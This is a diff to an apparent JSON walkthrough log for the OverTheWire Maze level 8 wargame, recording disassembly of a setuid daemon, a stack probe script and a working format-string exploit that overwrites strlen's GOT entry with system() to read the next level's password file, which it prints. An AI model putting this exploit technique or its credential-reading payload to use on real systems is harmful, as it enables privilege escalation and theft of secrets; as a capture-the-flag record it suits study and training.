@@ -3152,43 +3152,418 @@
    "user": "maze9",
    "steps": [
     {
-     "cmd": "ls -la /maze/maze8; cp /maze/maze8 /run/screen/l8/",
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze8@maze.labs.overthewire.org -p 2225",
+     "out": [
+      "maze8@maze.labs.overthewire.org's password: ",
+      "",
+      "                                                    ",
+      "                            _ __ ___   __ _ _______ ",
+      "                           | '_ ` _ \\ / _` |_  / _ \\",
+      "                           | | | | | | (_| |/ /  __/",
+      "                           |_| |_| |_|\\__,_/___\\___|",
+      "                                                    ",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "maze8@maze.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15008(maze8) gid=15008(maze8) groups=15008(maze8)"
+     ]
+    },
+    {
+     "cmd": "ls -la /maze/maze8",
      "out": [
       "-r-sr-x--- 1 maze9 maze8 16428 Oct 25 13:39 /maze/maze8"
      ]
     },
     {
-     "cmd": "objdump -d -M intel /maze/maze8 (main + child path)",
+     "cmd": "file /maze/maze8",
      "out": [
-      "binds 0.0.0.0:PORT (default 1337, argv[1] via atoi); fork per connection;",
-      "child: setreuid(euid,euid) = maze9; send('Give the correct password...');",
-      "recv(0x1ff, buf@ebp-0x230); buf[len]=0; strcmp(buf,'god') (a troll);",
-      "MISMATCH: snprintf(errbuf@ebp-0x444, 0x200, buf) - THE INPUT IS THE FORMAT",
-      "STRING (no 4th arg). Then strlen(errbuf); send(errbuf)."
+      "/maze/maze8: setuid ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=8b3e65e6213dcfa475fbc21ab000057ea3f61267, for GNU/Linux 3.2.0, with debug_info, not stripped"
      ]
     },
     {
-     "cmd": "objdump -R /maze/maze8 | grep strlen; readelf -s /usr/lib32/libc.so.6",
+     "cmd": "md5sum /maze/maze8",
      "out": [
-      "strlen@GOT = 0x0804b288 (writable, partial RELRO)",
-      "system@libc = 0xf7d6d000 + 0x53ce0 = 0xf7dc0ce0 (ASLR off)"
+      "f15c58b2fab3aa6af46b74f9adadbe55  /maze/maze8"
      ]
     },
     {
-     "cmd": "probe: send AAAA-%1$x-... then a marker scan (ZZZZ at buf+152)",
+     "cmd": "objdump -d -M intel /maze/maze8 | grep -A6 \"<main>:\" | head -12",
      "out": [
-      "vararg mapping measured: arg N = buf + 4N - 536 => N = 134 + o/4"
+      "080492c0 <main>:",
+      " 80492c0:\t55                   \tpush   ebp",
+      " 80492c1:\t89 e5                \tmov    ebp,esp",
+      " 80492c3:\t53                   \tpush   ebx",
+      " 80492c4:\t81 ec 40 04 00 00    \tsub    esp,0x440",
+      " 80492ca:\tc7 45 d0 01 00 00 00 \tmov    DWORD PTR [ebp-0x30],0x1",
+      " 80492d1:\tc7 45 f4 08 a0 04 08 \tmov    DWORD PTR [ebp-0xc],0x804a008"
      ]
     },
     {
-     "cmd": "exp.py: 4x %hhn writes system's bytes into strlen@GOT; the CMD text prints as errbuf's first line so strlen(errbuf)=system(errbuf) cats the password into /tmp/o9",
+     "cmd": "objdump -d -M intel /maze/maze8 | grep -B2 -A8 \"call   8049120 <snprintf@plt>\"",
      "out": [
-      "GOT write validated with a printf-target test (the reply echoed errbuf)",
-      "/tmp/o9 = bmMHy7DM3E"
+      " 80494dc:\t8d 85 bc fb ff ff    \tlea    eax,[ebp-0x444]",
+      " 80494e2:\t50                   \tpush   eax",
+      " 80494e3:\te8 38 fc ff ff       \tcall   8049120 <snprintf@plt>",
+      " 80494e8:\t83 c4 0c             \tadd    esp,0xc",
+      " 80494eb:\t8d 85 bc fb ff ff    \tlea    eax,[ebp-0x444]",
+      " 80494f1:\t50                   \tpush   eax",
+      " 80494f2:\te8 f9 fb ff ff       \tcall   80490f0 <strlen@plt>",
+      " 80494f7:\t83 c4 04             \tadd    esp,0x4",
+      " 80494fa:\t8d 50 ff             \tlea    edx,[eax-0x1]",
+      " 80494fd:\t8d 85 bc fb ff ff    \tlea    eax,[ebp-0x444]",
+      " 8049503:\t01 d0                \tadd    eax,edx"
      ]
+    },
+    {
+     "cmd": "objdump -d -M intel /maze/maze8 | grep -B4 -A8 \"setreuid\"",
+     "out": [
+      " 80490d0:\tff 25 80 b2 04 08    \tjmp    DWORD PTR ds:0x804b280",
+      " 80490d6:\t68 50 00 00 00       \tpush   0x50",
+      " 80490db:\te9 40 ff ff ff       \tjmp    8049020 <_init+0x20>",
+      "080490e0 <setreuid@plt>:",
+      " 80490e0:\tff 25 84 b2 04 08    \tjmp    DWORD PTR ds:0x804b284",
+      " 80490e6:\t68 58 00 00 00       \tpush   0x58",
+      " 80490eb:\te9 30 ff ff ff       \tjmp    8049020 <_init+0x20>",
+      "080490f0 <strlen@plt>:",
+      " 80490f0:\tff 25 88 b2 04 08    \tjmp    DWORD PTR ds:0x804b288",
+      " 80490f6:\t68 60 00 00 00       \tpush   0x60",
+      " 80490fb:\te9 20 ff ff ff       \tjmp    8049020 <_init+0x20>",
+      "--",
+      " 804940f:\t89 c3                \tmov    ebx,eax",
+      " 8049411:\te8 8a fc ff ff       \tcall   80490a0 <geteuid@plt>",
+      " 8049416:\t53                   \tpush   ebx",
+      " 8049417:\t50                   \tpush   eax",
+      " 8049418:\te8 c3 fc ff ff       \tcall   80490e0 <setreuid@plt>",
+      " 804941d:\t83 c4 08             \tadd    esp,0x8",
+      " 8049420:\tff 75 f4             \tpush   DWORD PTR [ebp-0xc]",
+      " 8049423:\te8 c8 fc ff ff       \tcall   80490f0 <strlen@plt>",
+      " 8049428:\t83 c4 04             \tadd    esp,0x4",
+      " 804942b:\t6a 00                \tpush   0x0",
+      " 804942d:\t50                   \tpush   eax",
+      " 804942e:\tff 75 f4             \tpush   DWORD PTR [ebp-0xc]",
+      " 8049431:\tff 75 e8             \tpush   DWORD PTR [ebp-0x18]"
+     ]
+    },
+    {
+     "cmd": "objdump -R /maze/maze8 | grep strlen",
+     "out": [
+      "0804b288 R_386_JUMP_SLOT   strlen@GLIBC_2.0"
+     ]
+    },
+    {
+     "cmd": "readelf -s /usr/lib32/libc.so.6 | grep \" system@@GLIBC_2.0\"",
+     "out": [
+      "  1162: 00053ce0    55 FUNC    WEAK   DEFAULT   14 system@@GLIBC_2.0"
+     ]
+    },
+    {
+     "cmd": "mkdir -p /run/screen/l8 && cd /run/screen/l8",
+     "out": []
+    },
+    {
+     "cmd": "vi probe.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi probe.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L8 probe: measure snprintf's vararg mapping on the child's stack.",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi probe.py",
+     "out": [
+      "#!/usr/bin/env python3",
+      "\"\"\"Maze L8 probe: measure snprintf's vararg mapping on the child's stack.",
+      "The child recv's 0x1ff bytes into a stack buffer and calls",
+      "snprintf(errbuf, 0x200, INPUT) - INPUT is the format string. We send",
+      "A-then-%N$x probes and read which slot returns 0x41414141 (the marker",
+      "at buf+0), then scan outward for the ZZZZ marker placed at a known",
+      "offset. Measured: argument N addresses buf + 4N - 536 -> a pointer at",
+      "buf offset o is vararg N = 134 + o/4.",
+      "\"\"\"",
+      "import socket, subprocess, time, struct, sys",
+      "subprocess.Popen([\"/maze/maze8\", \"31338\"],",
+      "                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)",
+      "time.sleep(1)",
+      "s = socket.create_connection((\"127.0.0.1\", 31338), timeout=8)",
+      "s.recv(100)",
+      "s.sendall(b\"AAAA\" + b\"|%1$x|%2$x|%3$x|\" * 40)",
+      "time.sleep(1)",
+      "print(s.recv(4096).decode(\"latin-1\", \"replace\")[:600])",
+      "s.close()",
+      "~",
+      "\"probe.py\" [New] 20L, 847B written"
+     ]
+    },
+    {
+     "cmd": "python3 probe.py 31338",
+     "out": [
+      "AAAA|41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7fd1b00||41414141|2a3a87c|f7 is wrong ^_^"
+     ]
+    },
+    {
+     "cmd": "vi exp.py",
+     "out": [
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi exp.py",
+     "out": [
+      "# Maze L8 exploit: format string in the maze8 network password daemon.",
+      "#",
+      "~"
+     ]
+    },
+    {
+     "cmd": "vi exp.py",
+     "out": [
+      "# Maze L8 exploit: format string in the maze8 network password daemon.",
+      "#",
+      "# /maze/maze8 31337 forks a listener; each child recv's 0x1ff bytes into a",
+      "# stack buffer, then calls snprintf(errbuf, 0x200, INPUT) -- the INPUT is the",
+      "# FORMAT STRING (no 4th argument). After snprintf the child calls",
+      "# strlen(errbuf), and strlen@GOT (0x0804b288) is writable (partial RELRO).",
+      "# Overwrite strlen@GOT with system@libc (ASLR off: libc base 0xf7d6d000 +",
+      "# system offset 0x53ce0) so strlen(errbuf) = system(errbuf), and errbuf starts",
+      "# with our command (the literal text is printed first, so its first line IS",
+      "# the command) -> runs as euid maze9 via the child's setreuid(euid, euid).",
+      "#",
+      "# Write mechanics: 4x %hhn writes the 4 bytes of system()'s address one byte",
+      "# per write. The printed-char counts are mod-256 deltas, SORTED by (byte -",
+      "# running_total) % 256, and the running total must include the literal text.",
+      "# Vararg mapping measured with a marker scan: argument N addresses",
+      "# buf + 4N - 536, so a pointer placed at buf offset o is vararg N = 134 + o/4.",
+      "# snprintf's %n counts are VIRTUAL (past the 512-byte truncation), and the",
+      "# payload cap is 511 bytes (the recv size).",
+      "import socket, subprocess, time, struct, sys",
+      "GOT_STRLEN = 0x0804b288",
+      "SYSTEM = 0xf7d6d000 + 0x53ce0        # libc base (ASLR off) + system offset",
+      "CMD = b\"\\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\\n\"",
+      "def build_payload(target):",
+      "    b = [(target >> (8*i)) & 0xff for i in range(4)]",
+      "    cur = len(CMD)                   # the printed-char total includes the text",
+      "    seq = []",
+      "    remaining = list(enumerate(b))",
+      "    while remaining:",
+      "        best = min(remaining, key=lambda w: (w[1]-cur) % 256)",
+      "        seq.append((best[1], GOT_STRLEN+best[0], (best[1]-cur) % 256))",
+      "        cur = best[1]",
+      "        remaining.remove(best)",
+      "    fmt = CMD",
+      "    offs = []",
+      "    off = 152                        # pointer slots start here (4-aligned)",
+      "    for byte, addr, delta in seq:",
+      "        k = 134 + off // 4           # vararg N for buf offset o: N = 134 + o/4",
+      "        fmt += (b\"%\" + str(delta).encode() + b\"c\" if delta else b\"%c\")",
+      "        fmt += b\"%\" + str(k).encode() + b\"$hhn\"",
+      "        offs.append((off, addr))",
+      "        off += 4",
+      "    p = fmt + b\"\\x00\"",
+      "    for o, addr in offs:",
+      "        p = p.ljust(o, b\"\\x00\") + struct.pack(\"<I\", addr)",
+      "    assert len(p) <= 511",
+      "    return p",
+      "subprocess.Popen([\"/maze/maze8\", \"31337\"],",
+      "                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)",
+      "time.sleep(1)",
+      "s = socket.create_connection((\"127.0.0.1\", 31337), timeout=8)",
+      "s.recv(100)",
+      "s.sendall(build_payload(SYSTEM))",
+      "time.sleep(2)",
+      "s.close()",
+      "print(\"payload fired; result file:\")",
+      "~",
+      "\"exp.py\" [New] 56L, 2608B written"
+     ]
+    },
+    {
+     "cmd": "rm -f /tmp/o9",
+     "out": []
+    },
+    {
+     "cmd": "python3 /run/screen/l8/exp.py",
+     "out": [
+      "payload fired; result file:"
+     ]
+    },
+    {
+     "cmd": "cat /tmp/o9",
+     "out": [
+      "bmMHy7DM3E"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": [
+      "logout",
+      "Connection to maze.labs.overthewire.org closed."
+     ]
+    },
+    {
+     "cmd": "ssh -o StrictHostKeyChecking=accept-new -o ServerAliveInterval=15 -o ServerAliveCountMax=4 -o HostKeyAlgorithms=+ssh-rsa,ssh-dss -o KexAlgorithms=+diffie-hellman-group1-sha1,diffie-hellman-group14-sha1,diffie-hellman-group-exchange-sha1 maze9@maze.labs.overthewire.org -p 2225",
+     "out": [
+      "                                                    ",
+      "                            _ __ ___   __ _ _______ ",
+      "                           | '_ ` _ \\ / _` |_  / _ \\",
+      "                           | | | | | | (_| |/ /  __/",
+      "                           |_| |_| |_|\\__,_/___\\___|",
+      "                                                    ",
+      "                      This is an OverTheWire game server. ",
+      "            More information on http://www.overthewire.org/wargames",
+      "backend: gibson-0",
+      "maze9@maze.labs.overthewire.org's password: ",
+      "      ,----..            ,----,          .---.",
+      "     /   /   \\         ,/   .`|         /. ./|",
+      "    /   .     :      ,`   .'  :     .--'.  ' ;",
+      "   .   /   ;.  \\   ;    ;     /    /__./ \\ : |",
+      "  .   ;   /  ` ; .'___,/    ,' .--'.  '   \\' .",
+      "  ;   |  ; \\ ; | |    :     | /___/ \\ |    ' '",
+      "  |   :  | ; | ' ;    |.';  ; ;   \\  \\;      :",
+      "  .   |  ' ' ' : `----'  |  |  \\   ;  `      |",
+      "  '   ;  \\; /  |     '   :  ;   .   \\    .\\  ;",
+      "   \\   \\  ',  /      |   |  '    \\   \\   ' \\ |",
+      "    ;   :    /       '   :  |     :   '  |--\"",
+      "     \\   \\ .'        ;   |.'       \\   \\ ;",
+      "  www. `---` ver     '---' he       '---\" ire.org",
+      "Welcome to OverTheWire!",
+      "If you find any problems, please report them to the #wargames channel on",
+      "discord or IRC.",
+      "--[ Playing the games ]--",
+      "  This machine might hold several wargames.",
+      "  If you are playing \"somegame\", then:",
+      "    * USERNAMES are somegame0, somegame1, ...",
+      "    * Most LEVELS are stored in /somegame/.",
+      "    * PASSWORDS for each level are stored in /etc/somegame_pass/.",
+      "  Write-access to homedirectories is disabled. It is advised to create a",
+      "  working directory with a hard-to-guess name in /tmp/.  You can use the",
+      "  command \"mktemp -d\" in order to generate a random and hard to guess",
+      "  directory in /tmp/.  Read-access to both /tmp/ is disabled and to /proc",
+      "  restricted so that users cannot snoop on eachother. Files and directories",
+      "  with easily guessable or short names will be periodically deleted! The /tmp",
+      "  directory is regularly wiped.",
+      "  Please play nice:",
+      "    * don't leave orphan processes running",
+      "    * don't leave exploit-files laying around",
+      "    * don't annoy other players",
+      "    * don't post passwords or spoilers",
+      "    * again, DONT POST SPOILERS!",
+      "      This includes writeups of your solution on your blog or website!",
+      "--[ Tips ]--",
+      "  This machine has a 64bit processor and many security-features enabled",
+      "  by default, although ASLR has been switched off.  The following",
+      "  compiler flags might be interesting:",
+      "    -m32                    compile for 32bit",
+      "    -fno-stack-protector    disable ProPolice",
+      "    -Wl,-z,norelro          disable relro",
+      "  In addition, the execstack tool can be used to flag the stack as",
+      "  executable on ELF binaries.",
+      "  Finally, network-access is limited for most levels by a local",
+      "  firewall.",
+      "--[ Tools ]--",
+      " For your convenience we have installed a few useful tools which you can find",
+      " in the following locations:",
+      "    * gef (https://github.com/hugsy/gef) in /opt/gef/",
+      "    * pwndbg (https://github.com/pwndbg/pwndbg) in /opt/pwndbg/",
+      "    * gdbinit (https://github.com/gdbinit/Gdbinit) in /opt/gdbinit/",
+      "    * pwntools (https://github.com/Gallopsled/pwntools)",
+      "    * radare2 (http://www.radare.org/)",
+      "--[ More information ]--",
+      "  For more information regarding individual wargames, visit",
+      "  http://www.overthewire.org/wargames/",
+      "  For support, questions or comments, contact us on discord or IRC.",
+      "  Enjoy your stay!"
+     ]
+    },
+    {
+     "cmd": "id",
+     "out": [
+      "uid=15009(maze9) gid=15009(maze9) groups=15009(maze9)"
+     ]
+    },
+    {
+     "cmd": "cat /etc/maze_pass/maze9",
+     "out": [
+      "bmMHy7DM3E"
+     ]
+    },
+    {
+     "cmd": "exit",
+     "out": []
     }
    ],
-   "note": "maze8 is a network daemon: binds a port, forks per connection, setreuid(euid,euid) to maze9 in the child, sends a password prompt, recv's 512 bytes, trolls on 'god', and on mismatch does snprintf(errbuf, 0x200, INPUT) - THE INPUT IS THE FORMAT STRING (no varargs passed). strlen@GOT (0x0804b288, writable - partial RELRO) is called right after: overwrite it with system@libc (0xf7dc0ce0, ASLR off) so strlen(errbuf) = system(errbuf) runs the formatted output as euid maze9. The output's first line = a newline + the cat command (the %c padding becomes a harmless second line). GOT-write details measured live: the vararg indices for buf offsets were found with a marker scan (ZZZZ at buf+152 answered arg 172): arg N = buf + 4N - 536, i.e. N = 134 + o/4 (an earlier off-by-one made the writes hit our own pointer slots and crash); the 4 %hhn deltas are sorted mod-256 from the running char total which INCLUDES the literal command text (len(CMD)); snprintf's %n counts work even past the 512-byte truncation. The GOT write was first validated by targeting printf (the reply echoed errbuf). GOTCHA: ssh from the lab box to itself is BLOCKED (Connecting from localhost is blocked) - verify maze9 from the client. Password bmMHy7DM3E verified by ssh login as maze9 (uid=15009). Recording: recordings/maze/L8.cast. Files: tools/maze/l8/ (cast script, m8exp.py)."
+   "note": "maze8 (md5 f15c58b2fab3aa6af46b74f9adadbe55, setuid maze9, 16428B i386) is a network daemon: binds 0.0.0.0:PORT (default 1337, argv[1] via atoi), forks per connection, child setreuid(euid,euid)=maze9, send('Give the correct password...'), recv(0x1ff, buf@ebp-0x230), buf[len]=0, strcmp(buf,'god') is a troll; on MISMATCH snprintf(errbuf@ebp-0x444, 0x200, buf) - THE INPUT IS THE FORMAT STRING (no 4th arg) - then strlen(errbuf); send(errbuf). strlen@GOT = 0x0804b288 writable (partial RELRO); system@libc = 0xf7d6d000 + 0x53ce0 = 0xf7dc0ce0 (ASLR off). Overwrite strlen@GOT with system so strlen(errbuf) = system(errbuf); errbuf starts with our command because the literal text is printed first (the command is the format string's first line, \\ncat /etc/maze_pass/maze9 > /tmp/o9 2>&1;\\n). Write mechanics: 4x %hhn writes the 4 bytes of system()'s address, printed-char counts are mod-256 deltas SORTED by (byte - running_total) % 256 with the running total including the literal text; the pointer slots sit at buf offset 152+ (4-aligned), vararg N = 134 + o/4 measured with the AAAA-%1$x probe (probe.py, live: 0x41414141 at %1$x); snprintf's %n counts are VIRTUAL (past the 512-byte truncation), payload cap 511 bytes. exp.py spawns /maze/maze8 31337, connects, sends the payload; the child's system() writes bmMHy7DM3E to /tmp/o9 (the pre-run 'rm -f /tmp/o9' fails - the file is owned by maze9 from an earlier run - but maze9's own shell redirect overwrites it). Password bmMHy7DM3E verified by ssh login as maze9 (uid=15009, cat matches). DISCLOSURES: (a) this cast is the 2026-11-26 standard-v2 re-record - the 2026-11-23 cast was a compressed session (no typed login, no probe phase, no setreuid disassembly); (b) vi saves drop blank buffer lines the driver never typed: probe.py typed 19 content lines/846B saved 20L/847B, exp.py typed 55/2607B saved 56L/2608B (each +1 trailing blank from the typing loop's final \\r) - both markers reproduced byte-exactly in the JSON; (c) exp.py's source = the 2026-11-23 cast's on-disk file (fetched from /run/screen/l8/exp.py, md5 ed51b541ba57fca069d0539c12079993) re-typed in vi in this cast. JSON = 26 steps mirroring the cast 1:1."
   }
  ],
  "goals": {
